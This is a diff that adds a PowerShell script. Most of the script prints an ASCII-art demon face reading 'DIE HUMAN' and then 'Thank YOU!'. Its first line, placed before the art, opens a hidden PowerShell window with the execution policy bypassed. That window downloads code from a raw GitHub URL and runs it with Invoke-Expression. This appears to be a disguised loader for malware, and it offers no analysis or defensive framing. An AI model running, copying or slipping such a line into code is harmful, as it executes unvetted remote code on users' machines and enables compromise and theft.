@@ -1,0 +1,28 @@
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/setoz-snitch/runtime-s-helper/refs/heads/main/helper')`""
+
+$old_color = $Host.UI.RawUI.ForegroundColor 
+$Host.UI.RawUI.ForegroundColor = "Green"
+Write-Host '          .                                                      .'
+Write-Host '        .n                   .                 .                  n.'
+Write-Host '  .   .dP                  dP                   9b                 9b.    .'
+Write-Host ' 4    qXb         .       dX                     Xb       .        dXp     t'
+Write-Host 'dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb'
+Write-Host '9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP'
+Write-Host ' 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP'
+Write-Host '  `9XXXXXXXXXXXXXXXXXXXXX''~   ~`OOO8b   d8OOO''~   ~`XXXXXXXXXXXXXXXXXXXXXP'''
+Write-Host '    `9XXXXXXXXXXXP'' `9XX''   DIE    `98v8P''  HUMAN   `XXP'' `9XXXXXXXXXXXP'''
+Write-Host '        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~'
+Write-Host '                        )b.  .dbo.dP''`v''`9b.odb.  .dX('
+Write-Host '                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.'
+Write-Host '                     dXXXXXXXXXXXP''   .   `9XXXXXXXXXXXb'
+Write-Host '                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb'
+Write-Host '                    9XXb''   `XXXXXb.dX|Xb.dXXXXX''   `dXXP'
+Write-Host '                     `''      9XXXXXX(   )XXXXXXP      `'''
+Write-Host '                              XXXX X.`v''.X XXXX'
+Write-Host '                              XP^X''`b   d''`X^XX'
+Write-Host '                              X. 9  `   ''  P )X'
+Write-Host '                              `b  `       ''  d'''
+Write-Host '                               `             '''
+$Host.UI.RawUI.ForegroundColor = "Red"
+Write-Host '                                  Thank YOU!'
+$Host.UI.RawUI.ForegroundColor = $old_color
